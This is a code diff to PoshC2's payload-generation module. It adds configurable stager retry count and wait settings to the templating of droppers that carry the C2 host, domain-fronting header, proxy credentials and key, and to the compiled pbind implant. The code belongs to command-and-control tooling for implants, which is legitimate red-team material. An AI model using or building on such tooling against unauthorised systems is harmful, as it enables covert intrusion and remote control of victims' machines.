@@ -3,7 +3,7 @@ import gzip, base64, subprocess, os, hashlib, shutil, re, donut, importlib
 from enum import Enum
 
 from poshc2.server.Config import PayloadsDirectory, PayloadTemplatesDirectory, DefaultMigrationProcess, PayloadModulesDirectory
-from poshc2.server.Config import PBindSecret as DefaultPBindSecret, PBindPipeName as DefaultPBindPipeName
+from poshc2.server.Config import PBindSecret as DefaultPBindSecret, PBindPipeName as DefaultPBindPipeName, StageRetries, StageRetriesInitialWait
 from poshc2.Colours import Colours
 from poshc2.Utils import gen_key, randomuri, formStr, offsetFinder, get_first_url, get_first_dfheader
 from poshc2.server.database.DB import get_url_by_id, get_default_url_id, select_item
@@ -31,7 +31,7 @@ class Payloads(object):
         self.KillDate = KillDate
         self.Key = Key
         self.QuickCommand = select_item("QuickCommand", "C2Server")
-        self.FirstURL = get_first_url(select_item("PayloadCommsHost", "C2Server"), select_item("DomainFrontHeader", "C2Server"))        
+        self.FirstURL = get_first_url(select_item("PayloadCommsHost", "C2Server"), select_item("DomainFrontHeader", "C2Server"))
         self.PayloadCommsHost = urlDetails[2]
         self.DomainFrontHeader = urlDetails[3]
         self.Proxyurl = urlDetails[4]
@@ -47,6 +47,8 @@ class Payloads(object):
         self.PBindPipeName = PBindPipeName if PBindPipeName else DefaultPBindPipeName
         self.PBindSecret = PBindSecret if PBindSecret else DefaultPBindSecret
         self.BaseDirectory = BaseDirectory
+        self.StageRetries = StageRetries
+        self.StageRetriesInitialWait = StageRetriesInitialWait
         self.PSDropper = ""
         self.PyDropper = ""
 
@@ -86,7 +88,9 @@ class Payloads(object):
             .replace("#REPLACEUSERAGENT#", self.UserAgent) \
             .replace("#REPLACEREFERER#", self.Referrer) \
             .replace("#REPLACEURLID#", str(self.URLID)) \
-            .replace("#REPLACEKEY#", self.Key)
+            .replace("#REPLACEKEY#", self.Key) \
+            .replace("#REPLACESTAGERRETRIES#", self.StageRetries) \
+            .replace("#REPLACESTAGERRETRIESWAIT#", self.StageRetriesInitialWait)
 
     def QuickstartLog(self, txt):
         if not self.quickstart:
@@ -189,7 +193,9 @@ class Payloads(object):
             .replace("#REPLACEPROXYURL#", self.Proxyurl) \
             .replace("#REPLACEPROXYUSER#", self.Proxyuser) \
             .replace("#REPLACEPROXYPASSWORD#", self.Proxypass) \
-            .replace("#REPLACEURLID#", str(self.URLID))
+            .replace("#REPLACEURLID#", str(self.URLID)) \
+            .replace("#REPLACESTAGERRETRIES#", self.StageRetries) \
+            .replace("#REPLACESTAGERRETRIESWAIT#", self.StageRetriesInitialWait)
 
         with open("%s%sdropper.cs" % (self.BaseDirectory, name), 'w') as f:
             f.write(str(content))
@@ -207,7 +213,7 @@ class Payloads(object):
 
         with open("%s%spbind.cs" % (self.BaseDirectory, name), 'w') as f:
             f.write(str(content))
-        
+
         subprocess.check_output("mono-csc %s%spbind.cs -out:%sPB.exe -target:exe -warn:1 -sdk:4" % (self.BaseDirectory, name, self.BaseDirectory), shell=True)
 
         subprocess.check_output("mono-csc %s%spbind.cs -out:%sPB.exe -target:exe -warn:1 -sdk:4" % (self.BaseDirectory, name, self.BaseDirectory), shell=True)
